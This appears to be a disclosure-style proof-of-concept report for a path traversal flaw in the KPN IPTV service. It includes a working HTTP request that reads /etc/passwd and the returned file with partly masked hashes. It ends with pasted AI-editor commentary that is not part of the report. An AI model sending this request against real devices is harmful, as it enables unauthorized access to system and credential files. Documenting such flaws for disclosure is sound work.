# KPN IPTV File Path Traversal Vulnerability - PoC (2023)

## Overview

This report demonstrates a **file path traversal vulnerability** discovered in the KPN IPTV service, which allows an attacker to access sensitive system files, such as `/etc/passwd`, without proper authorization. The vulnerability arises from insufficient input validation, enabling directory traversal by manipulating the URL.

---

## Vulnerability Details

A **directory traversal** attack (also known as path traversal) occurs when an attacker can craft a URL that accesses files outside the intended directory scope of a web server. By adding `../` sequences, attackers can navigate up the file system and access files that should be restricted, such as configuration files or user information.

### Affected URL:
```plaintext
http://192.168.2.x:8081/Service/Controller/UI?ip=192.168.2.x&port=8081
```

# Proof of Concept (PoC)
* Malicious Request Example

* Using a crafted HTTP request, an attacker can access the sensitive /etc/passwd file. The request can be tested using Burp Suite or another HTTP proxy tool.
*Burp Suite Request:
```
http

GET /Service/Controller/UI../../../../../../../../../../../../../../../../etc/passwd?ip=192.168.2.x&port=8081 HTTP/1.1
Host: 192.168.2.x:8081
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

* In this request, the attacker exploits the path traversal vulnerability by using ../ sequences to navigate out of the web server’s intended directory structure and access the /etc/passwd file.

# Server Response

* The server responds with HTTP 200 OK, and the contents of the /etc/passwd file are returned. For privacy, the password hashes have been blurred:

plaintext
```
HTTP/1.1 200 OK
Content-Type: unknown
Content-Length: 940

root:$5$96bRk************$uTSh**************RLdK1ND*********/XLWC:0:0:root:/home/root:/bin/sh
daemon:*:1:1:daemon:/usr/sbin:/bin/sh
bin:*:2:2:bin:/bin:/bin/sh
sys:*:3:3:sys:/dev:/bin/sh
sync:*:4:65534:sync:/bin:/bin/sync
games:*:5:60:games:/usr/games:/bin/sh
man:*:6:12:man:/var/cache/man:/bin/sh
lp:*:7:7:lp:/var/spool/lpd:/bin/sh
mail:*:8:8:mail:/var/mail:/bin/sh
news:*:9:9:news:/var/spool/news:/bin/sh
uucp:*:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:*:13:13:proxy:/bin:/bin/sh
www-data:*:33:33:www-data:/var/www:/bin/sh
backup:*:34:34:backup:/var/backups:/bin/sh
list:*:38:38:Mailing List Manager:/var/list:/bin/sh
irc:*:39:39:ircd:/var/run/ircd:/bin/sh
gnats:*:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:*:65534:65534:nobody:/nonexistent:/bin/sh
ntpd:x:1001:65534:Linux User,,,:/var/shared/empty:/bin/sh
utc:$5$qkymr************$M1qu**************JoEifmNs********AiybaC:1000:1000:utc:/home/utc:/bin/sh
```

# Explanation of /etc/passwd

* The /etc/passwd file is critical for user management in Unix-based systems. It contains essential information about user accounts, including:

    * Username: The user’s login name.
    * Password hash: (If stored here, although modern systems use /etc/shadow).
    * UID: User ID.
    * GID: Group ID.
    * Home Directory: The path to the user’s home directory.
    * Shell: The default shell assigned to the user.

Although modern systems store password hashes in /etc/shadow, disclosing /etc/passwd can still reveal valuable information for further attacks.
Impact

# Exploiting this vulnerability could result in the following:
```
   * Information Disclosure: Access to /etc/passwd reveals usernames and potentially hashed passwords.
   * Privilege Escalation: Attackers may use the disclosed information to crack passwords and escalate privileges.
   * Further Exploitation: Combined with other vulnerabilities, this attack could lead to unauthorized system access.
```
# Mitigation Strategies

* To prevent directory traversal attacks like this, the following countermeasures should be implemented:

   * Input Validation: Strictly validate and sanitize all user inputs to disallow sequences like ../.
   * Directory Restrictions: Implement proper file permissions and ensure the web server does not allow access to sensitive directories.
   * Web Application Firewalls (WAFs): Deploy WAFs to detect and block malicious URL patterns indicative of path traversal attacks.

# Conclusion

*Path traversal vulnerabilities pose a significant security risk by allowing attackers to access files that should remain confidential. In this case, the KPN IPTV service was found to be vulnerable to directory traversal, which can lead to the exposure of sensitive files like /etc/passwd. Ensuring proper input validation, restricting directory access, and implementing security mechanisms like WAFs are critical to preventing such vulnerabilities.
References

    OWASP: Path Traversal
    KPN Security

markdown


### Key Improvements:
1. **Enhanced readability**: I’ve added clear sections with headers and spacing to improve the flow of information.
2. **Professional tone**: The language has been made more formal and professional, suitable for a security report.
3. **Markdown formatting**: Ensured proper Markdown elements are used (e.g., code blocks, bullet points).
4. **Mitigation section**: Highlighted specific recommendations to prevent such vulnerabilities.
5. **Conclusion and references**: Added a conclusion to summarize the importance of mitigating this type of attack and included references for further reading.

This version is more polished, clear, and ready for a professional setting like GitHub or a formal vulnerability report.

